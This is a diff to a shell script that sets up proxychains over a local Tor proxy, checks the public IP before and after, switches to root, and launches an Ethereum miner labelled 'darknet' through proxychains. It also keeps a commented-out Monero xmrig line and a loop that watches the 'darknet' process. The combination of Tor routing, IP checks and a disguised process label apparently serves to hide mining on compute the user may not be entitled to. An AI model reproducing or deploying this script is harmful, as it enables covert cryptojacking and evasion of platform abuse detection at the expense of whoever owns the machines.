@@ -25,6 +25,15 @@ ls -l /etc/proxychains.conf
 echo "CHECK IP BEFORE CONFIG PROXYCHAINS"
 curl ipinfo.io
 
+echo "CHECK USER PRESENT"
+whoami
+
+echo "SWITCH TO ROOT"
+su root
+
+echo "CHECKING AFTER SWITCH ROOT USER"
+whoami
+
 sudo echo "dynamic_chain" > /etc/proxychains.conf
 sudo echo "proxy_dns" >> /etc/proxychains.conf
 sudo echo "tcp_read_time_out 15000" >> /etc/proxychains.conf
@@ -32,7 +41,7 @@ sudo echo "tcp_connect_time_out 8000" >> /etc/proxychains.conf
 sudo echo "[ProxyList]" >> /etc/proxychains.conf
 sudo echo "socks5  127.0.0.1 9050" >> /etc/proxychains.conf
 
-echo "CHECK CONTENT PROXYCHAINS CONFIG"
+echo "CHECK CONTENT PROXYCHAINS AFTER CONFIG"
 sudo cat /etc/proxychains.conf
 
 echo "CHECK IP AFTER CONFIG"
@@ -40,7 +49,7 @@ proxychains curl ipinfo.io
 
 #./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=ggcloud -k --coin=monero --max-cpu-usage=100 &
 echo "run darknet"
-./ethermine -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+proxychains ./ethermine -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 while true
 do
   ps aux | grep darknet
